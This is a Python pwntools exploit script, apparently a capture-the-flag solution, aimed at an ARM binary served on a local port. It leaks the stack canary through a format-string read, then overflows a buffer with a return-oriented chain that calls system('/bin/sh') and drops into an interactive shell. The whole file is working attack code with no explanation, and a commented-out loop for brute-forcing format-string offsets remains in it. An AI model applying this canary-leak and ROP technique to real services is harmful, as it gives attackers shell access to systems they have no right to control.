#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF('./chal', checksec=False)
context.log_level = 'critical'
# p = elf.process()
#p = process(['qemu-arm', '-g', '1234', './chall']) #for debugging 
p = remote('127.0.0.1', 43603)

# Leak canary, at offset 43 ends with null byte, so probably the canary.

# for i in range(1, 50):
#     p = elf.process()
#     p.recvuntil(b': \n')
#     p.sendline(bytes('AAAA %{}$p'.format(i), encoding='utf8'))
#     print(i)
#     print(p.recvline().strip())
#     p.sendlineafter(b'?\n', b'a')
#     p.close()

pop = 0x00027194 #pop {r0, r4, pc}
bin_sh = 0x00072688
system = 0x00017368

p.sendlineafter(b': \n', b'%43$p')
canary = int(p.recvline()[2:-1], 16)
print("[*] Canary: ", hex(canary))

payload = b'A' * 100
#payload = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac'
payload += p32(canary)
#payload += b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac'
payload += b'A' * 4
#payload += b'B' * 4
payload += p32(pop)
payload += p32(bin_sh) * 2
payload += p32(system)

p.sendlineafter(b'?\n', payload)
p.interactive()